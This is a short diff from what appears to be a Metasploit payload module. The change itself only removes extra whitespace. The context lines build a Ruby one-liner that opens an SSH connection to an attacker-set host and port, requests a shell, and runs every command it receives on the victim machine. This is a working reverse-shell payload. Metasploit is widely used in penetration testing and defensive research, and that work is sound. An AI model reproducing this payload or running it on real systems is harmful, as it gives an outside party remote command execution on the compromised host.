@@ -43,7 +43,7 @@ module MetasploitModule
   def command_string
     lhost = datastore['LHOST']
     lhost = "[#{lhost}]" if Rex::Socket.is_ipv6?(lhost)
-    frk   = datastore['PrependFork'] ? 'exit if fork;' : ''
+    frk = datastore['PrependFork'] ? 'exit if fork;' : ''
     res = "ruby -rnet/ssh -e '#{frk}Net::SSH.start(\"#{lhost}\",port:#{datastore['LPORT']},paranoid:false)"
     res << '{|s|s.open_channel{|c|c.request_pty{|a|a.send_channel_request("shell")};'
     res << 'c.on_data{|a,d|begin;c.send_data(`#{d}`);rescue;end}};s.loop}\''
